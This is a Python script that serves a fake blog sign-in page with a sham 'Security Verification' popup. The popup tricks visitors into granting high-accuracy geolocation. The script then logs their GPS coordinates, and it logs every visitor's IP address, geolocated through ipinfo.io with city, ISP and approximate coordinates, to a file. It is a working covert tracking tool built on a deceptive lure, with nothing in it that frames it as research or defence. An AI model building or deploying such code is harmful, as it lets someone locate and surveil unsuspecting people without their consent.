from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import requests
import urllib.parse as urlparse

# HTML for the fake blog sign-in page with custom popup
html = """
<html>
<head>
    <title>My Everyday Blog</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; background: #f9f9f9; }
        .container { background: #fff; padding: 20px; border-radius: 8px; max-width: 400px; margin: auto; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
        button { padding: 10px 20px; background: #4285f4; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #3367d6; }
        .footer { margin-top: 30px; font-size: 12px; color: gray; }
        #overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center; z-index:999; }
        #popup { background:#fff; padding:20px; border-radius:8px; width:80%; max-width:300px; text-align:center; }
        #popup button { background:#28a745; color:white; padding:10px; border:none; border-radius:4px; cursor:pointer; margin-top:15px; }
    </style>
</head>
<body>
    <div id="overlay">
        <div id="popup">
            <h3>Security Verification</h3>
            <p>To continue using My Everyday Blog, please verify your location.</p>
            <button onclick="getLocation()">Allow Access</button>
        </div>
    </div>

    <div class="container">
        <h2>Sign in to My Everyday Blog</h2>
        <input type="text" placeholder="Email">
        <input type="password" placeholder="Password">
        <button>Sign In</button>
        <p id="status" style="margin-top:15px; color:gray;">Waiting for verification...</p>
    </div>
    <p class="footer">Created by <b>kchiong</b></p>

    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error, {enableHighAccuracy:true});
            } else {
                document.getElementById("status").innerText = "Geolocation not supported.";
                document.getElementById("overlay").style.display = "none";
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Send coordinates to server
            fetch('/log?lat=' + lat + '&lon=' + lon + '&accuracy=' + accuracy);
            document.getElementById("status").innerText = "Verified. Loading...";
            document.getElementById("overlay").style.display = "none";
        }

        function error() {
            // If denied, still allow browsing (server will use IP fallback)
            document.getElementById("status").innerText = "Location access denied. Using default verification.";
            document.getElementById("overlay").style.display = "none";
        }
    </script>
</body>
</html>
"""

class IPLoggerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # --- Handle GPS logging ---
        if self.path.startswith("/log?"):
            query = urlparse.urlparse(self.path).query
            params = urlparse.parse_qs(query)
            lat = params.get("lat", ["Unknown"])[0]
            lon = params.get("lon", ["Unknown"])[0]
            acc = params.get("accuracy", ["Unknown"])[0]
            log_entry = f"GPS Coordinates: {lat},{lon} | Accuracy: {acc}m"
            logging.info(log_entry)
            with open("ips.txt", "a") as f:
                f.write(log_entry + "\n")
            self.send_response(200)
            self.end_headers()
            return

        # --- IP fallback logging ---
        forwarded_for = self.headers.get('X-Forwarded-For')
        client_ip = forwarded_for.split(',')[0] if forwarded_for else self.client_address[0]

        try:
            response = requests.get(f"https://ipinfo.io/{client_ip}/json")
            data = response.json()
            city = data.get("city", "Unknown")
            region = data.get("region", "Unknown")
            country = data.get("country", "Unknown")
            org = data.get("org", "Unknown ISP")
            loc = data.get("loc", "Unknown")
        except Exception:
            city = region = country = org = loc = "Unavailable"

        log_entry = f"IP: {client_ip} | {city}, {region}, {country} | ISP: {org} | Approx. Coordinates: {loc}"
        logging.info(log_entry)
        with open("ips.txt", "a") as f:
            f.write(log_entry + "\n")

        # Serve fake blog page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode('utf-8'))

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, IPLoggerHandler)
    print("Server running on port 8080...")
    httpd.serve_forever()
